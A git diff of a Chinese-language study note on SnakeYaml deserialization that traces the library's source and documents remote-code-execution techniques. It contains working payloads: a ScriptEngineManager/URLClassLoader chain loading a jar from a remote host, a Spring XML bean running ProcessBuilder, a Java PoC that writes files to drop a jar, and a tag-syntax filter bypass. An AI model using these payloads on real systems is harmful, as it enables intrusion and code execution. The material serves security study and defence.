@@ -17,36 +17,20 @@ SnakeYaml是一个完整的YAML1.1规范Processor，用于解析YAML，序列化
 - Yaml.load()：入参是一个字符串或者一个文件，返回一个Java对象
 - Yaml.dump()：将一个对象转化为yaml文件形式
 
-## dump
-
 ```java
-import com.demo.User;
-import org.yaml.snakeyaml.Yaml;
-
-public class SnakeYamlDemo {
-    public static void main(String[] args) {
-        User user = new User();
-        user.setName("Taco");
-        Yaml yaml = new Yaml();
-        System.out.println(yaml.dump(user));
-    }
-}
-```
-
-> !!com.demo.User {name: Taco}
->
-> **!!**用于强制类型转换，与fastjson中@type字段类似
-
-## load
-
-```java
-package com.demo;
+package com.snake.demo;
 
 public class User {
     private String name;
+    public int age;
 
-    public User(){
-        System.out.println("NonArg Constructor");
+    public User(String name, int age) {
+        this.name = name;
+        this.age = age;
+    }
+
+    public User() {
+        System.out.println("Non Arg Constructor");
     }
 
     public String getName() {
@@ -59,40 +43,92 @@ public class User {
         this.name = name;
     }
 
+    public int getAge() {
+        System.out.println("getAge");
+        return age;
+    }
+
+    public void setAge(int age) {
+        System.out.println("setAge");
+        this.age = age;
+    }
+
     @Override
     public String toString() {
-        return "My name is " + name;
+        return "I am " + name + ", " + age + " years old";
     }
 }
 ```
+
+## dump
 
 ```java
-import com.demo.User;
-import org.yaml.snakeyaml.Yaml;
-
-public class SnakeYamlDemo {
-    public static void main(String[] args) {
-        Yaml yaml = new Yaml();
-        String s = "!!com.demo.User {name: Taco}";
-        User user = yaml.load(s);
-        System.out.println(user);
-    }
-}
+User user = new User("taco", 18);
+Yaml yaml = new Yaml();
+System.out.println(yaml.dump(user));
 ```
 
-> NonArg Constructor
+> 打印结果:
+>
+> getName
+>
+> !!com.snake.demo.User {age: 18, name: taco}
+
+!!用于强制类型转换，与fastjson中@type字段类似
+
+`dump()`还调用了非public成员的`getter`
+
+## load
+
+```java
+String s = "!!com.snake.demo.User {age: 18, name: taco}";
+Yaml yaml = new Yaml();
+User user = yaml.load(s);
+System.out.println(user);
+```
+
+> Non Arg Constructor
+>
 > setName
-> My name is Taco
+>
+> I am taco, 18 years old
 
-调用了无参构造器和`setter`
+`load()`调用了无参构造器和非public成员的`setter`
 
-> 注意：若类属性是public修饰，不会调用对应的setter方法，而是通过反射来set
+实际上不仅无参构造器能够调用，还能指定调用有参构造器，只要传参类型为有参构造器的参数类型即可。
+
+```java
+String s = "!!com.snake.demo.User [\"taco\", 18]";
+Yaml yaml = new Yaml();
+User user = yaml.load(s);
+System.out.println(user);
+```
+
+> Arg Constructor Called
+>
+> I am taco, 18 years old
+
+此时就不会调用`setter`方法了
+
+> 若类属性是public修饰，不会调用对应的setter方法，而是通过反射来set
 
 # 0x03 Way To Attack
 
-yaml反序列化时可以通过`!!`+全类名指定反序列化的类，反序列化过程中会实例化该类，可以通过构造`ScriptEngineManager`payload并利用SPI机制通过`URLClassLoader`或者其他payload如JNDI方式远程加载实例化恶意类从而实现任意代码执行。
+yaml反序列化时通过`!!` + 全类名指定反序列化的类，和fastjson一样都会调用setter，不过对于public修饰的成员不会调用其setter，除此之外，snakeyaml反序列化时还能调用该类的构造函数（fastjson是通过ASM生成的）。
+
+## ScriptEngineManager
+
+构造`ScriptEngineManager`payload，利用SPI机制通过`URLClassLoader`远程加载恶意字节码文件。
 
 Github上面的EXP：https://github.com/artsploit/yaml-payload
+
+工具的工程classpath下存在`META-INF/services`文件夹
+
+`javax.script.ScriptEngineFactory`
+
+> artsploit.AwesomeScriptEngineFactory
+
+打成jar包
 
 > javac src/artsploit/AwesomeScriptEngineFactory.java
 >
@@ -110,25 +146,130 @@ Github上面的EXP：https://github.com/artsploit/yaml-payload
 
 ![image-20230123142111909](../.gitbook/assets/image-20230123142111909.png)
 
-# 0x04 Deep Source
+下面来看一下触发流程
 
-## ScriptEngineManager
+`javax.script.ScriptEngineManager`
 
 ![image-20230123143300458](../.gitbook/assets/image-20230123143300458.png)
 
 ![image-20230123143314631](../.gitbook/assets/image-20230123143314631.png)
 
-`ScriptEngineManager`的无参构造器调用了init()，进行初始化设置后调用`initEngines()`，接着到`getServiceLoader`
+`ScriptEngineManager`的无参构造器调用了init()，进行初始化设置后调用`initEngines()`，用于初始化脚本引擎。
+
+![image-20230815140815479](./../.gitbook/assets/image-20230815140815479.png)
+
+接着到`getServiceLoader`，用于获取`ServiceLoader`迭代器
 
 ![image-20230123144053760](../.gitbook/assets/image-20230123144053760.png)
 
-到了熟悉的`ServiceLoader.load()`返回一个`ServiceLoader<>`，根据这个可以获取一个迭代器，接下来还是熟悉的迭代遍历。
+到了熟悉的`ServiceLoader.load()`返回一个`ServiceLoader<T>`，根据这个可以获取一个迭代器，接下来还是熟悉的迭代遍历。
 
 ![image-20230123144716480](../.gitbook/assets/image-20230123144716480.png)
 
-`next() => nextService()`会加载接口实现类并实例化。
+`next() => nextService()`会加载接口实现类并实例化，在SPI那节已经介绍过了。
 
-## Yaml#load()
+## SpringFramework远程加载配置
+
+Spring当中有两个类的构造函数远程加载配置，可以构成RCE
+
+> org.springframework.context.support.ClassPathXmlApplicationContext
+> org.springframework.context.support.FileSystemXmlApplicationContext
+
+```xml
+<beans xmlns="http://www.springframework.org/schema/beans"
+       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+       xmlns:p="http://www.springframework.org/schema/p"
+       xsi:schemaLocation="http://www.springframework.org/schema/beans
+        http://www.springframework.org/schema/beans/spring-beans.xsd">
+   <bean id="exec" class="java.lang.ProcessBuilder" init-method="start">
+        <constructor-arg>
+          <list>
+            <value>calc</value>
+          </list>
+        </constructor-arg>
+    </bean>
+</beans>
+```
+
+> !!org.springframework.context.support.ClassPathXmlApplicationContext [\"http://127.0.0.1:8888/evil.xml\"]
+
+![image-20230815143625162](./../.gitbook/assets/image-20230815143625162.png)
+
+既然能触发getter，那么fastjson的大部分payload也可以用。
+
+## 写文件加载本地jar
+
+> !!sun.rmi.server.MarshalOutputStream [!!java.util.zip.InflaterOutputStream [!!java.io.FileOutputStream [!!java.io.File ["filePath"],false],!!java.util.zip.Inflater  { input: !!binary base64 },length]]
+
+filepath是写入路径，base64str为经过zlib压缩过后的文件内容,length为文件大小
+
+和fastjson一样，对于byte数组会自动进行base64解码(snakeyaml中为binary)
+
+```java
+import com.sun.org.apache.xml.internal.security.utils.JavaUtils;
+import org.yaml.snakeyaml.Yaml;
+
+import java.io.ByteArrayOutputStream;
+import java.io.IOException;
+import java.util.Base64;
+import java.util.zip.Deflater;
+
+public class SnakeYamlFilePOC {
+
+    public static void main(String[] args) throws IOException {
+        String poc = createPoc("E:/flag.txt", "E:/a.txt");
+        System.out.println(poc);
+//        Yaml yaml = new Yaml();
+//        yaml.load(poc);
+    }
+    public static String createPoc(String src, String path) throws IOException {
+        byte[] file = JavaUtils.getBytesFromFile(src);
+        int length = file.length;
+        byte[] compressed = compress(file);
+        String b64 = Base64.getEncoder().encodeToString(compressed);
+        String payload = "!!sun.rmi.server.MarshalOutputStream " +
+                "[!!java.util.zip.InflaterOutputStream [" +
+                    "!!java.io.FileOutputStream [" +
+                        "!!java.io.File [\"" + path + "\"],false]," +
+                        "!!java.util.zip.Inflater  { input: !!binary " + b64 + " }, " + length +
+                        "]]";
+        return payload;
+    }
+
+    public static byte[] compress(byte[] input) throws IOException {
+        Deflater deflater = new Deflater();
+        deflater.setInput(input);
+        deflater.finish();
+
+        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+
+        byte[] buffer = new byte[1024];
+        while (!deflater.finished()) {
+            int compressedSize = deflater.deflate(buffer);
+            outputStream.write(buffer, 0, compressedSize);
+        }
+
+        outputStream.close();
+        return outputStream.toByteArray();
+    }
+}
+```
+
+既然可以写文件，那就把jar写入目标环境，然后再通过URLClassloader本地加载
+
+```java
+Yaml yaml = new Yaml();
+String poc = createPoc("./yaml-payload.jar", "E:/evil.jar");
+yaml.load(poc);
+String s = "!!javax.script.ScriptEngineManager [\n" +
+    "!!java.net.URLClassLoader [[\n" +
+    "!!java.net.URL [\"file:///E:/evil.jar\"]\n" +
+    "]]\n" +
+    "]";
+yaml.load(s);
+```
+
+# 0x04 Yaml#load()
 
 ```java
 public <T> T load(String yaml) {
@@ -160,6 +301,10 @@ private Object loadFromReader(StreamReader sreader, Class<?> type) {
 
 若过滤了`!!`，可利用此tag规则进行绕过
 
+> !<tag:yaml.org,2002:javax.script.ScriptEngineManager> 
+> [!<tag:yaml.org,2002:java.net.URLClassLoader> [[!<tag:yaml.org,2002:java.net.URL> 
+> ["http://ip/yaml-payload.jar"]]]]
+
 接着调用`constructDocument()`对上面poc进行处理
 
 ![image-20230123150825914](../.gitbook/assets/image-20230123150825914.png)
@@ -177,8 +322,11 @@ node放入`recursiveObjects`，进入`constructor.construct(node)`
 遍历节点，调用`constructObject()`又循环回去了
 
 > constructObjectNoCheck()->
+>
 > BaseConstructor#construct()->
+>
 > Contructor#construct()->
+>
 > 迭代Contructor#constructObject()
 
 上面的POC有5个node，所以循环5次。
@@ -191,8 +339,8 @@ node放入`recursiveObjects`，进入`constructor.construct(node)`
 
 ![image-20230123153625236](../.gitbook/assets/image-20230123153625236.png)
 
+
+
 # Article To Learn
 
 [跳跳糖社区-SnakeYaml反序列化及不出网利用](https://mp.weixin.qq.com/s?__biz=MzkxNDMxMTQyMg==&mid=2247496898&idx=1&sn=9df9a236a3c437522bdf125cf92c6e24&chksm=c172e553f6056c4592696a15d5270e30386a229ca35d8eb1cf588498c95d78b28f2766975234&scene=27&key=7917b196593e1041903cc963f4d8e8dd309fc34822ec523c96ef6852b6eb00243ae09c3a475f21000c466a1481f5d9ef88661e5ccd3eae00b654271eecd790081cf9cb2b874e0566a9b1bf83ab3e3a9dffbce029a9983bd1e617a34873e1a5cf0d90ff63073904c1c64a7ab0832fd5396612ac69385a93896810c27b3466f6ca&ascene=0&uin=MzM0MTE3MTk2MQ%3D%3D&devicetype=Windows+10+x64&version=6308011a&lang=zh_CN&exportkey=n_ChQIAhIQk1l7Og6o32ldfRBgt0m%2F7xLgAQIE97dBBAEAAAAAAFyoNDyY7FgAAAAOpnltbLcz9gKNyK89dVj0STE6v0lILRu1tKDn0ZDKVMzBwrLXZCB%2BmUzHXSOZsIYr0w0A%2FcuvTqwms4Rt%2Fkjpf8zHxxTi8IwvjYn%2FDZ9Q33Hc5vfX2hilkR53helcExsLrLyslL%2FWBsef9XI%2F6wZMWmG6oy8JJGplsmLrW%2BxqvmnB4f5wILv176CzXoS3esuvsQ%2BhfcDKd%2FEfu5bUKYhs0ZoGh1vCyZD6VtP9NEg2tTCVHV3tJAqerIo%2BgJoEHIoL7rOFzs%2Fq0qic&acctmode=0&pass_ticket=Q7%2FiUlx9i6XS%2FNSi17wpXoqBYZHAHgY0basv8D4BZIN%2BCoAkTfFeOqqNDBcbXW05phWaLHgqOHGN8cecKlsdgw%3D%3D&wx_header=1&fontgear=2)
-
-不出网和其他利用后面学习其他知识之后再来补充
